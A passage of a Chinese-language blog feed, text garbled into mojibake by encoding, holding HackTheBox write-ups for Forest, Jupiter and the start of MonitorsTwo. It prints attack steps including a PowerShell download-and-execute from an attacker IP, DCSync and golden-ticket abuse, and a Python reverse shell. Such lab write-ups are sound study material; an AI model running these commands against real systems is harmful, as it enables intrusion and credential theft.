Principals</strong></p><p>å¯ä»¥å‘ç°svc-alfrescoåœ¨Account Operatorsç»„ä¸­ï¼Œè¯¥ç»„çš„æˆå‘˜å¯ä»¥åˆ›å»ºå’Œä¿®æ”¹å¤§å¤šæ•°ç±»å‹çš„å¸æˆ·ï¼ŒåŒ…æ‹¬ç”¨æˆ·ã€æœ¬åœ°ç»„å’Œå…¨å±€ç»„çš„å¸æˆ·ã€‚</p><p>å‚è€ƒï¼š<a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators" title="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators</a></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Og5lUwZJPE.png" alt=""></p><p><strong>Find Shortest Paths to Domain Admins</strong></p><p>åˆ†æåˆ°è¾¾Domain Adminsçš„æœ€çŸ­è·¯å¾„</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-xJi6br8uD.png" alt=""></p><p>Account Operatorsç»„å¯¹Exchange Windows Permissionsç»„æ‹¥æœ‰Generic ALLæƒé™</p><h4 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><ol><li>æ·»åŠ ä¸€ä¸ªç”¨æˆ·åˆ°Exchange Windows Permissionsç»„ä¸­</li><li>åˆ©ç”¨Exchange Windows Permissionsç»„çš„WriteDACLæˆäºˆç”¨æˆ·DCSyncæƒé™</li><li>é€šè¿‡DCSyncè¿›è¡ŒåŸŸåŒæ­¥å¹¶çªƒå–ç”¨æˆ·å“ˆå¸Œ</li></ol><p>æ·»åŠ ç”¨æˆ·è‡³Exchange Windows Permissions ç»„</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_RqBqBzOhA2.png" alt=""></p><p>å€ŸåŠ© PowerSploit ä¸­çš„ powerview.ps1 æ¥æ»¥ç”¨<code>WriteDacl</code>æƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iex(New-Object Net.webclient).downloadstring(<span class="hljs-string">&#x27;http://10.10.16.76:8000/PowerView.ps1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>åˆ›å»ºå‡­è¯å¯¹è±¡å¹¶æˆäºˆ DCSync æƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$pass</span> = convertto-securestring <span class="hljs-string">&#x27;passwd123&#x27;</span> -AsPlainText -Force<br><span class="hljs-variable">$cred</span> = New-Object System.Management.Automation.PSCredential (<span class="hljs-string">&#x27;HTB\aurey&#x27;</span>, <span class="hljs-variable">$pass</span>)<br>Add-DomainObjectAcl -Credential <span class="hljs-variable">$cred</span> -TargetIdentity <span class="hljs-string">&quot;DC=htb,DC=local&quot;</span> -PrincipalIdentity aurey -Rights DCSync<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MHATzSpUXl.png" alt=""></p><h4 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h4><p>DCSyncå¯ä»åˆ©ç”¨DRSåè®®é€šè¿‡IDL_DRSGetNCChangesä»åŸŸæ§åˆ¶å™¨å¤åˆ¶ç”¨æˆ·å‡­æ®</p><p>ä½¿ç”¨impacketçš„secretdump.pyè·å–hashå€¼</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_TswtwKGVJ4.png" alt=""></p><p>ä½¿ç”¨ <a href="http://wmiexec.py" title="wmiexec.py">wmiexec.py</a> é€šè¿‡å“ˆå¸Œä¼ é€’è¿æ¥ç®¡ç†å‘˜</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_4WPcocAXUc.png" alt=""></p><h3 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡DCSyncæ‹¿åˆ°çš„krbtgtåšä¸€ä¸ªé»„é‡‘ç¥¨æ®</p><ol><li>è·å–Domain SID</li></ol><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_oVPzDl3xKL.png" alt=""></p><ol><li>åˆ©ç”¨ä¸Šé¢è·å–åˆ°çš„Domain SIDå’Œkrbtgtåˆ¶ä½œé»„é‡‘ç¥¨æ®</li></ol><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_iWj0__81hD.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_mNcoq0Dbco.png" alt=""></p><h3 id="æ€»ç»“ä¸€ä¸‹"><a href="#æ€»ç»“ä¸€ä¸‹" class="headerlink" title="æ€»ç»“ä¸€ä¸‹"></a>æ€»ç»“ä¸€ä¸‹</h3><p>ç¬¬ä¸€å°Windowsé¶æœºï¼Œç®—æ˜¯å­¦ä¹ ä¸€ä¸‹å¥—è·¯ã€‚è·ŸLinuxé¶æœºæ¯”è¾ƒå¤§çš„åŒºåˆ«æ˜¯éœ€è¦ä¸€å®šçš„å‰ç½®çŸ¥è¯†</p><p>æ„Ÿè§‰éœ€è¦æ•´ç†ä¸€äº›ä¸œè¥¿ï¼Œå†å¼€å§‹æ‰“åé¢çš„Windowsé¶æœºï¼š</p><ul><li>Windowså¸¸è§ç«¯å£ä»¥åŠå¯¹åº”æœåŠ¡çš„æ‰“æ³•</li><li>å›é¡¾WindowsåŸŸæ¸—é€ç”¨åˆ°çš„å„ç§æ–¹æ³•</li></ul><h4 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h4><ul><li>Official WriteUp</li><li><a href="https://amirr0r.github.io/posts/htb-forest/" title="https://amirr0r.github.io/posts/htb-forest/">https://amirr0r.github.io/posts/htb-forest/</a></li><li><a href="https://www.freebuf.com/articles/system/325765.html" title="https://www.freebuf.com/articles/system/325765.html">https://www.freebuf.com/articles/system/325765.html</a></li><li><a href="https://medium.com/@sinfulz/hackthebox-forest-walkthrough-248fce6fc90d" title="https://medium.com/@sinfulz/hackthebox-forest-walkthrough-248fce6fc90d">https://medium.com/@sinfulz/hackthebox-forest-walkthrough-248fce6fc90d</a></li><li><a href="https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-forest/" title="https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-forest/">https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-forest/</a></li><li><a href="https://infosecwriteups.com/htb-forest-write-up-fdd45e8e73bf" title="https://infosecwriteups.com/htb-forest-write-up-fdd45e8e73bf">https://infosecwriteups.com/htb-forest-write-up-fdd45e8e73bf</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Pentest</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jupiter - HackTheBox</title>
    <link href="/2023/07/18/Jupiter-HackTheBox/"/>
    <url>/2023/07/18/Jupiter-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>å¹´è½»äººçš„ç¬¬ä¸€å°Mediumé¶æœºï¼Œæ²¡æƒ³åˆ°è¿™ä¹ˆé€†å¤©</p><p>å¼€å±€å…ˆæ‰«æ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dFWdzTPsfA.png" alt=""></p><h3 id="ä½“éªŒåŠŸèƒ½"><a href="#ä½“éªŒåŠŸèƒ½" class="headerlink" title="ä½“éªŒåŠŸèƒ½"></a>ä½“éªŒåŠŸèƒ½</h3><p>å¾ˆæ¼‚äº®çš„é¡µé¢</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_LE8jgMM2m3.png" alt=""></p><p>ä¸»é¡µç¿»äº†åŠå¤©ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œç›®å½•ã€jsæ¥å£ä»€ä¹ˆéƒ½æ‰¾ä¸åˆ°ã€‚å®åœ¨æ²¡åŠæ³•å»çœ‹äº†ä¸€ä¸‹writeup</p><h3 id="è™šæ‹Ÿä¸»æœºæ‰«æ"><a href="#è™šæ‹Ÿä¸»æœºæ‰«æ" class="headerlink" title="è™šæ‹Ÿä¸»æœºæ‰«æ"></a>è™šæ‹Ÿä¸»æœºæ‰«æ</h3><p>ä½¿ç”¨gobuster vhostçˆ†ç ´åˆ°äº†<code>kiosk.jupiter.htb</code>è™šæ‹Ÿä¸»æœºåï¼Œç®—æ˜¯å­¦åˆ°æ–°å§¿åŠ¿äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image__JojbIIcXD.png" alt=""></p><p>ä¸€ä¸ªGrafana&#x20;</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OoJTVk8IMy.png" alt=""></p><p>ä½¿ç”¨APIæ‰§è¡ŒSQLè¯­å¥ï¼ˆè¿™è¿˜æ˜¯Googleæ‰¾åˆ°çš„ï¼Œå›½å†…éƒ½æ˜¯åˆ†äº«æŸä¸ªæ¼æ´ï¼‰</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_qkUEi3Ct-P.png" alt=""></p><h3 id="PostgreSQL-RCE"><a href="#PostgreSQL-RCE" class="headerlink" title="PostgreSQL RCE"></a>PostgreSQL RCE</h3><p>å¯ä»¥æ‰§è¡Œpostgres SQLäº†ï¼Œè¿›ä¸€æ­¥åˆ©ç”¨å‚è€ƒ</p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce">https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce</a></p><p>ç›´æ¥è¯•è¯•RCE</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_n2RS9v0OEw.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_VHMTzmoQWH.png" alt=""></p><p>æ‹¿ä¸‹ ï¼ˆæœ¬ä»¥ä¸ºå¯ä»¥å¼€å§‹ææƒäº†å°±å¯ä»¥ç¾æ»‹æ»‹æ‹¿ä¸‹ä¸€å°Mediumé¶æœºäº†ï¼Œæ²¡æƒ³åˆ°è¿™æ‰æ˜¯å™©æ¢¦çš„å¼€å§‹</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JTsMmB1RUj.png" alt=""></p><h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_L7hs3nx1mL.png" alt=""></p><p>PEASSæ‰¾åˆ°äº†ä¸€äº›ä¿¡æ¯ä½†æ²¡æ³•ç›´æ¥ææƒï¼Œç”¨pspyçœ‹ä¸€ä¸‹è¿›ç¨‹è¯•è¯•</p><p>å¯ä»¥çœ‹åˆ°jovianæœ‰åœ¨è¿è¡Œjupyter</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ur2AveS-BM.png" alt=""></p><p>junoä¼šè¿è¡Œ<code>/home/juno/shadow-simulation.sh</code> å’Œ</p><p><code>/home/juno/.local/bin/shadow /dev/shm/network-simulation.yml</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ixPaGBJpTp.png" alt=""></p><p>æŸ¥äº†ä¸€ä¸‹shadowå‘½ä»¤æ˜¯ç”¨æ¥ç®¡ç†å¯†ç çš„ï¼Œæˆ‘ä»¬çœ‹çœ‹<code>/dev/shm/network-simulation.yml</code>æ˜¯ä»€ä¹ˆå†…å®¹</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_jVr_y52xbe.png" alt=""></p><p>æ„Ÿè§‰æ˜¯ä¸ªCSæ¶æ„çš„è„šæœ¬ï¼Œpythonå¼€ä¸ªæœåŠ¡ç«¯ï¼Œcurlä½œä¸ºå®¢æˆ·ç«¯å»è¯·æ±‚</p><p>è¿›ç¨‹ä¸­ä¹Ÿæ˜¯è¿™æ ·</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_0-RM-2GSip.png" alt=""></p><p>è„šæœ¬ç”±junoæ‰§è¡Œï¼Œæ‹¥æœ‰å®ƒçš„æƒé™ï¼Œæˆ‘ç›´æ¥å†™ä¸€æ‰‹å…¬é’¥ï¼Œå®ç°å…å¯†ç™»å½•</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-CbluHyD9r.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_TMLnDluvHe.png" alt=""></p><p>è®°å¾—ç»™<code>/tmp/test</code>æ‰“ä¸Š777æƒé™ï¼Œä»¥é˜²junoæ²¡æƒé™ã€‚é™å¾…ç‰‡åˆ»ï¼Œå°±å¯ä»¥å…å¯†ç™»å½•äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_hr6VPekhTL.png" alt=""></p><p>ç»ˆäºæ‹¿ä¸‹User Flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dmIOcuwQpl.png" alt=""></p><p>è„šæœ¬é‡Œçš„å†…å®¹è·Ÿæˆ‘ä»¬åœ¨è¿›ç¨‹é‡Œçœ‹åˆ°çš„ä¸€è‡´</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_6GsKGo9rG3.png" alt=""></p><h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><p>è¿›ç¨‹ä¿¡æ¯å‘ç°jovianå¼€äº†jupyter-notebookè·‘è„šæœ¬<code>/opt/solar-flares/flares.ipynb</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gVhKvuN2pc.png" alt=""></p><p>PATHè¿™é‡Œä¼¼ä¹æœ‰å¾—åˆ©ç”¨</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_kMD6EKET4R.png" alt=""></p><p>ç«¯å£å¼€äº†ä¸å°‘</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_r_Lfxl6TXk.png" alt=""></p><p>è¿™é‡Œæ˜¾ç¤ºæˆ‘ä»¬å¯ä»¥ä¿®æ”¹<code>/opt/solar-flares</code>ä¸‹çš„ä¸€äº›æ–‡ä»¶ï¼Œè¿˜è®°å¾—jovianç”¨æˆ·æ‰§è¡Œçš„Jupyteræ–‡ä»¶å—ï¼Œå¯æƒœæˆ‘ä»¬ä¸èƒ½ç›´æ¥æ”¹é‚£ä¸ªè„šæœ¬</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cJrI2qkaDg.png" alt=""></p><p>ä¸Šé¢å¼€äº†æŒºå¤šç«¯å£ï¼Œå¤–éƒ¨éƒ½è®¿é—®ä¸åˆ°ã€‚æˆ‘ä»¬è¿™é‡Œè€ƒè™‘æ•´ä¸ªéš§é“è¿›å»</p><h4 id="ä¸¤å±‚ç«¯å£è½¬å‘"><a href="#ä¸¤å±‚ç«¯å£è½¬å‘" class="headerlink" title="ä¸¤å±‚ç«¯å£è½¬å‘"></a>ä¸¤å±‚ç«¯å£è½¬å‘</h4><p>VPSä¸Šå°†é¶æœºçš„3000ç«¯å£è½¬å‘åˆ°VPSçš„3000ç«¯å£ä¸Š</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_990DP69Aqq.png" alt=""></p><p>æœ¬åœ°å°†VPSçš„3000ç«¯å£è½¬å‘åˆ°æœ¬åœ°çš„3000ç«¯å£ä¸Š</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gLsTUXn2jg.png" alt=""></p><p>å³å¯é€šè¿‡æœ¬åœ°è®¿é—®åˆ°é¶æœºä¸­çš„<code>127.0.0.1:3000</code>ï¼Œè¿™é‡Œè¿˜æ˜¯é‚£ä¸ªGrafanaï¼Œæˆ‘çœ‹çœ‹8888æ˜¯ä»€ä¹ˆ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gZguUUq3QC.png" alt=""></p><p>8888æ˜¯ä¸€å°Jupyter</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_YRctifwFk3.png" alt=""></p><p>å‚è€ƒä¸€ä¸‹exploit-notesï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°tokenç›´æ¥ç™»å½•Jupyterï¼Œç„¶åJupyterçš„æ§åˆ¶å°å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œé€šè¿‡ä¹‹å‰çš„è¿›ç¨‹å¯ä»¥çœ‹åˆ°è¿™æ˜¯jovianåœ¨è·‘çš„ï¼Œæ‹¿ä¸‹å®ƒå°±å¯ä»¥æ‹¿åˆ°joviançš„æƒé™äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Wj6n1DHgC9.png" alt=""></p><p><a href="https://exploit-notes.hdks.org/exploit/machine-learning/jupyter-notebook-pentesting/">https://exploit-notes.hdks.org/exploit/machine-learning/jupyter-notebook-pentesting/</a></p><p>ä¸€æ‰‹grepæ‹¿ä¸‹token</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aAx83pgF9E.png" alt=""></p><p>åˆ©ç”¨ipynbåå¼¹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">import socket,os,pty;s=socket.socket();s.connect((&quot;<span class="hljs-number">10.10</span>.<span class="hljs-number">16.76</span>&quot;, <span class="hljs-number">9999</span>));[os.dup2(s.fileno(),fd) <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> (0,1,2)];pty.spawn(<span class="hljs-string">&quot;bash&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_p7vfDE27bY.png" alt=""></p><p>çœ‹åˆ°è¿™é‡Œå…è®¸sudoï¼Œæˆ‘å¹¶æ²¡æœ‰å¯†ç ï¼Œå¸Œæœ›æ˜¯ä¸ªå…å¯†sudo</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_U0Y9ZBcli9.png" alt=""></p><p>éå¸¸nice</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5DJxf9v0jf.png" alt=""></p><p>æ‰§è¡Œä¸€ä¸‹å‘ç°æç¤ºæˆ‘ä»¬æ²¡æœ‰é…ç½®æ–‡ä»¶</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_EAOEoEe7YG.png" alt=""></p><p>ä½†æ˜¯æ²¡ç”¨è¿‡sattrackè¿™ä¸ªå·¥å…·ï¼Œæ²¡æœ‰æ–‡æ¡£çœ‹</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-iruoxmxss.png" alt=""></p><p>ä¸Šç½‘æœäº†ä¸€ä¸‹ï¼Œå…¶ä»–åœ°æ–¹å•¥éƒ½æœä¸åˆ°ï¼Œåªèƒ½çœ‹è¿™ç¯‡è®ºæ–‡äº†ã€‚æˆ‘æ˜¯çœŸæ²¡æƒ³åˆ°æ‰“ä¸ªé¶æœºè¿˜å¾—çœ‹è®ºæ–‡â€¦</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_SXgQnoh2jC.png" alt=""></p><p>è®ºæ–‡é‡Œä¹Ÿæ˜¯ä¸€é¡¿ä»‹ç»ï¼Œåªèƒ½çŸ¥é“è¿™æ˜¯ä¸€ä¸ªå«æ˜Ÿè½¨é“é¢„æµ‹å’Œå®æ—¶è·Ÿè¸ªç¨‹åºï¼Œå¹¶æ²¡æœ‰å…·ä½“çš„ç”¨æ³•å’Œå‘½ä»¤ã€‚</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_GcMV3rK-pg.png" alt=""></p><p>åªèƒ½å‘æŒ¥ä¸€ä¸‹CTFä½™çƒ­ï¼Œstringsä¸€ä¸‹çœ‹çœ‹èƒ½ä¸èƒ½å‘ç°ä»€ä¹ˆ</p><p><code>/tmp/config.json</code>ä¸å­˜åœ¨ï¼Œæœ‰å¯èƒ½å°±æ˜¯sattrackæƒ³è¦çš„é…ç½®æ–‡ä»¶</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_3T22lTH-O9.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_PUti8NGbiu.png" alt=""></p><p>æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå†æ‰§è¡Œå‘½ä»¤ï¼Œç¡®å®ç°åœ¨æ²¡æœ‰æç¤ºæ‰¾ä¸åˆ°é…ç½®æ–‡ä»¶äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_4Pz7xB-tUP.png" alt=""></p><p>ä½†æ˜¯è¿™é…ç½®æ–‡ä»¶è¿˜æ˜¯ä¸çŸ¥é“æ€ä¹ˆå†™ï¼Œåé¢æƒ³èµ·<code>/usr/local/share</code>ä¸€èˆ¬ä¼šæ”¾ä¸€äº›é…ç½®æ¡ˆä¾‹</p><p>ç›´æ¥findå¼€æ‰¾</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CauIjEU8d4.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7Kj00JOFDl.png" alt=""></p><p>å¤åˆ¶è¿‡æ¥æ‰§è¡Œä¸€ä¸‹ï¼Œè¿™é‡Œä¼¼ä¹ä¼šå»ä¸‹è½½tlesourcesæŒ‡å®šçš„æ–‡ä»¶ã€‚</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HDiUE-9v9E.png" alt=""></p><p>è¯•ä¸€ä¸‹æŠŠtlesourcesæ”¹æˆflagçš„åœ°å€</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_W7FS4heVMt.png" alt=""></p><p>ç»ˆäºæ‹¿ä¸‹äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Rme1oSXEWw.png" alt=""></p><h4 id="æ€»ç»“ä¸€ä¸‹"><a href="#æ€»ç»“ä¸€ä¸‹" class="headerlink" title="æ€»ç»“ä¸€ä¸‹"></a>æ€»ç»“ä¸€ä¸‹</h4><p>å¤ªæŠ˜ç£¨äº†ï¼Œä¸»è¦ä¹Ÿæ˜¯æˆ‘æ‰“å¾—æ–­æ–­ç»­ç»­çš„ï¼ˆæ¯å¤©ä¸‹ç­æ—¶é—´æ‰“ä¸€ä¸‹ï¼Œå…¬å¸ä¸€ä¸‹åˆæ–­å¼€å›å®¶æ‰“ï¼‰ã€‚è¿™æ³¢æ‰“ä¸‹æ¥è¿˜æ˜¯å­¦åˆ°å¾ˆå¤šçš„ï¼ˆè™šæ‹Ÿä¸»æœºæ‰«æã€é€šè¿‡Grafana æ‰“PostgreSQL GetShellã€ç”¨æˆ·å®šæ—¶ä»»åŠ¡è„šæœ¬ææƒã€ä¸¤å±‚ç«¯å£è½¬å‘æ‰“å†…ç½‘æœåŠ¡ã€æ¶å¿ƒçš„æ²¡ç”¨è¿‡çš„è½¯ä»¶ææƒï¼‰</p><p>è€Œä¸”è¿™ä¸ªsattrackææƒè¿˜æ²¡æœ‰writeupï¼Œå¤§ä¼™éƒ½æ˜¯æœ‰<code>/usr/local/bin/sattrack</code>è¯»å†™æƒé™ï¼Œç›´æ¥</p><p><code>cp /bin/bash /usr/local/bin/sattrack</code>å†<code>sudo /bin/bash</code>å°±å®Œäº‹äº† ğŸ˜“ï¼ˆå®˜æ–¹åœ¨ä¸€ä¸ªæœˆå‰ä¿®å¤äº†è¿™ä¸ªBugï¼‰</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image-20230718234530269.png" alt=""></p><p>æœ€åï¼Œç‹ ç‹ çš„ç»™ä»–æ‰“ä¸ª8åˆ†ï¼ˆè™½ç„¶æˆ‘è¿˜æ²¡æ‰“è¿‡Hard</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vjsWQXlpIr.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>Pentest</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MonitorsTwo - HackTheBox</title>
    <link href="/2023/07/16/MonitorsTwo-HackTheBox/"/>
    <url>/2023/07/16/MonitorsTwo-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>ç«¯å£è¿˜æ²¡æ‰«å®Œï¼Œç›´æ¥æµè§ˆå™¨è®¿é—®ä¸€ä¸‹ï¼ŒGoogleä¸€æœï¼ŒRCE</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Q6F88cIx3M.png" alt=""></p><h3 id="CVE-2022-46169-CACTI-1-2-22"><a href="#CVE-2022-46169-CACTI-1-2-22" class="headerlink" title="CVE-2022-46169-CACTI-1.2.22"></a>CVE-2022-46169-CACTI-1.2.22</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vlWca8mr7s.png" alt=""></p><p>ç›´æ¥æ‹¿ä¸‹</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_bnxOO6aQgw.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NQThyjlhnm.png" alt=""></p><h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><p>ä½†æ˜¯www-dataç”¨æˆ·è¿å®¶ç›®å½•éƒ½æ— ï¼Œè¿™é‡Œæ²¡æœ‰æ‰¾åˆ°user flag</p><p>ç›´æ¥ä¸ŠLinpeas æ”¶é›†ä¸€ä¸‹ä¿¡æ¯ï¼Œå‘ç°äº†ä¸€ä¸ªè„šæœ¬ <code>entrypoint.sh</code>å’Œä¸¤ä¸ªæ•°æ®åº“å¯†ç </p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_t7OuKTMMe5.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JNh6xed6cX.png" alt=""></p><p>è¿™é‡Œä¹Ÿæ˜¯ä¸€ä¸ªè¿æ¥æ•°æ®åº“çš„è„šæœ¬ï¼Œå€’æ˜¯å‘ç°äº†æœ‰ä¸ªhostä¸ºdbçš„æ•°æ®åº“</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_9IMi2gGAqP.png" alt=""></p><p>dbçš„åœ°å€æ‰¾ä¸åˆ°ï¼Œä¸è¿‡æœ‰ä¸ª<code>172.19.0.3</code>ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è¿æ¥</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8zDCX02DIY.png" alt=""></p><p>ç»“æœå°±æ˜¯å¤±è´¥äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8i6wujwPhZ.png" alt=""></p><p>è¿™é‡Œæ˜¯åœ¨æ²¡åŠæ³•äº†ï¼Œå»ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹writeupï¼Œå‘ç°å¤§ä¼™ä½¿ç”¨ <code>getent</code>å‘ç°çš„æ•°æ®åº“åœ°å€</p><blockquote><p><code>getent</code> å‘½ä»¤ç”¨æ¥æŸ¥çœ‹ç³»ç»Ÿçš„æ•°æ®åº“ä¸­çš„ç›¸å…³è®°å½•ã€‚å³ä½¿è¿™äº›æ•°æ®åº“ä¸æ˜¯åœ¨æœ¬åœ°ï¼Œæ¯”å¦‚ ldap æˆ–è€… nis ä¸­çš„æ•°æ®åº“ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ getent æŸ¥çœ‹ã€‚</p></blockquote><h4 id="Docker-é€ƒé€¸"><a href="#Docker-é€ƒé€¸" class="headerlink" title="Docker é€ƒé€¸"></a>Docker é€ƒé€¸</h4><p>ç™»å½•MySQLæˆåŠŸï¼Œæœ¬æ¥æƒ³åœ¨mysql.useré‡Œé¢æŸ¥ä¿¡æ¯çš„ï¼Œç»“æœPasswordè¿™ä¸€åˆ—ç›´æ¥è¢«åˆ ã€‚äºæ˜¯è½¬æˆ˜cacti</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_H3B7f1i3PQ.png" alt=""></p><p>ä½¿ç”¨johnçˆ†ç ´ä¸€ä¸‹ï¼Œå¾—å‡ºæ˜æ–‡å¯†ç </p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MBtQQHdVmg.png" alt=""></p><p>æ‹¿ä¸‹User Flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xhl4G00v7d.png" alt=""></p><h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><p>SUIDå’Œsudoçœ‹äº†ä¸€ä¸‹æ˜¯æ²¡æœ‰äº†ï¼Œç›´æ¥ä¸Šlinpeaså†æŸ¥æŸ¥</p><p>å€’æ˜¯å‘ç°äº†ä¸ªatææƒæ¼æ´</p><p><img 